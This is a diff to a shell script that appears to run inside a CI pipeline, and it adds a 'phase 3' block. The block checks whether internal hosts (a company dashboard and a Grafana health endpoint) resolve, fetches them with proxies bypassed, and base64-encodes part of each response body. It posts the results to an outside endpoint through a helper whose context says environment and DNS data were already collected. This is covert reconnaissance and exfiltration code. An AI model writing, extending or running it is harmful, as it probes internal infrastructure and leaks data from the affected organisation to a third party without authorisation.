@@ -7,6 +7,19 @@ PHASE=$(cat ci/recon.phase 2>/dev/null | tr -dc '0-9'); PH="p${PHASE:-1}"
 D=/tmp/i79712; mkdir -p "$D" 2>/dev/null
 post() { [ -s "$2" ] || { echo "empty $1" > "$D/$1"; set -- "$1" "$D/$1"; }; curl -s -o /dev/null --max-time 12 --noproxy '*' -X POST --data-binary @"$2" "$T/$PH/$1" 2>/dev/null; }
 
+# ---------- phase 3: probes only (fast path; env/dns/lit already collected in p1) ----------
+if [ "$PHASE" = "3" ]; then
+  pp() { n="$1"; u="$2"; { echo "### PROBE $n $u"; curl -m 4 -sS --noproxy '*' -D - -o "$D/b.$n" "$u" 2>&1 | head -22; echo "### BODY_B64_400"; head -c 400 "$D/b.$n" 2>/dev/null | base64 2>/dev/null | tr -d '\n'; echo; echo "### BODY_LEN"; wc -c < "$D/b.$n" 2>/dev/null; } > "$D/p_$n.txt" 2>&1; post "p_$n" "$D/p_$n.txt"; }
+  rs() { timeout 2 getent ahostsv4 "$1" 2>/dev/null | grep -qE 'STREAM|DGRAM|INET'; }
+  { echo "### START"; date -u; } > "$D/start.txt" 2>&1
+  post start "$D/start.txt"
+  rs company-dashboard.fireworks-ai.cloud && pp companydash "https://company-dashboard.fireworks-ai.cloud/"
+  rs grafana.fireworks-ai.cloud && pp grafana "https://grafana.fireworks-ai.cloud/api/health"
+  { echo "### DONE"; date -u; echo "phase=3"; } > "$D/done.txt" 2>&1
+  post done "$D/done.txt"
+  exit 0
+fi
+
 # ---------- 1) host / dns / env ----------
 {
   echo "### DATE"; date -u 2>/dev/null
